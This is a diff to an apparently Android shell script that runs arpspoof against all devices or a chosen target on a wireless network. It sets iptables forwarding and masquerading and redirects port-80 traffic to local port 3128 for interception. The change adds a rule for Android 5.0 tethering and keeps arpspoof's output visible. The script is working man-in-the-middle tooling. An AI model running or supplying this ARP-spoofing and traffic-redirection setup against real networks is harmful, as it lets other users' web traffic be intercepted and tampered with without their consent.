@@ -18,7 +18,7 @@ if [ "$1" = "all" ]
 then
 	echo "Starting ARP Spoofing for all devices"
 	echo arpspoof -i $WLAN "$2"
-	$ARPSPOOF -i $WLAN "$2" 2>&1 >/dev/null &
+	$ARPSPOOF -i $WLAN "$2" &
 	ARP1="$!"
 elif [ "$1" == "none" ]
 then
@@ -31,13 +31,15 @@ else
 fi
 
 echo iptables -P FORWARD ACCEPT # Android 4.0 requires this
+echo iptables -I natctrl_FORWARD -j RETURN
 echo iptables -t nat -A POSTROUTING -j MASQUERADE
 echo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
 
 
 $IPTABLES -P FORWARD ACCEPT || echo "iptables (1) failed" # Android 4.0 requires this
-$IPTABLES -t nat -A POSTROUTING -j MASQUERADE || echo "iptables (2) failed"
-$IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128 || echo "iptables (3) failed"
+$IPTABLES -I natctrl_FORWARD -j RETURN || echo "iptables (2) failed" # Android 5.0 with tethering requires this
+$IPTABLES -t nat -A POSTROUTING -j MASQUERADE || echo "iptables (3) failed"
+$IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128 || echo "iptables (4) failed"
 
 # Wait for finish
 read
@@ -49,9 +51,11 @@ kill $ARP1 2>/dev/null
 
 echo iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
 echo iptables -t nat -D POSTROUTING -j MASQUERADE
+echo iptables -D natctrl_FORWARD -j RETURN
 
-$IPTABLES -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128 || echo "iptables (4) failed"
-$IPTABLES -t nat -D POSTROUTING -j MASQUERADE || echo "iptables (5) failed"
+$IPTABLES -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128 || echo "iptables (5) failed"
+$IPTABLES -t nat -D POSTROUTING -j MASQUERADE || echo "iptables (6) failed"
+$IPTABLES -D natctrl_FORWARD -j RETURN || echo "iptables (7) failed"
 
 
 wait
